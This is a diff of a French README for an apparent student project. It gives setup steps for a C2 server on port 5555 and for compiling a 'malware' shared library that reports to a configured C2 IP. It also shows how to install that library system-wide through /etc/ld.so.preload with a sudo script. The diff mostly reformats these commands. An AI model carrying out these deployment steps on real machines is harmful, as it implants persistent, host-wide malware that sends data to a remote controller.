@@ -44,19 +44,22 @@ CC1-DATABASE-ESGI/
 
 - OpenSSH installé :
 
-  sudo apt install openssh-server
-  sudo nano /etc/ssh/sshd_config
-  # Modifier: Port 5555
-  sudo systemctl enable ssh
-  sudo systemctl start ssh
+  sudo apt install openssh-server |
+  sudo nano /etc/ssh/sshd_config |
+  ### Modifier: Port 5555
+  sudo systemctl enable ssh |
+  |sudo systemctl start ssh
 🔧 Compilation du serveur + base
-
-cd ~/server/CC1-DATABASE-ESGI/server
-make clean
-make
+______________________
+Terminal 2 cd ../BTreeDB :
+|make clean | make
+______________________
+Terminal 1 cd ~/server/CC1-DATABASE-ESGI/server:
+|make clean
+|make
 🚀 Lancer le serveur C2
 
-./server
+./server |
 Le serveur écoute sur le port 5555
 Il reçoit :
 
@@ -73,20 +76,21 @@ sudo apt install openssh-server
 Dans send_to_c2.c, modifier l’IP du serveur (ligne #define C2_IP "...") :
 
 
-#define C2_IP "192.168.1.20"
-#define C2_PORT 5555
+#define C2_IP "192.168.1.20" |
+#define C2_PORT 5555 |
 Vous pouvez aussi modifier le port C2 si nécessaire.
 
 🔧 Compilation
 
-cd ~/mal/CC1-DATABASE-ESGI/LD_PRELOAD/malware
-make
-🐚 Injection automatique via LD_PRELOAD
-
-chmod +x add_to_ldso.sh
-sudo ./add_to_ldso.sh
+cd ~/mal/CC1-DATABASE-ESGI/LD_PRELOAD/malware |
+___________
+ make
+_______________________________
+chmod +x add_to_ldso.sh |
+sudo ./add_to_ldso.sh |
+______________________________
 Cela ajoute le chemin absolu de malware.so dans /etc/ld.so.preload
-
+🐚 Injection automatique via LD_PRELOAD
 
 | Fonction                         | Description                                                                                                                                               |
 | -------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
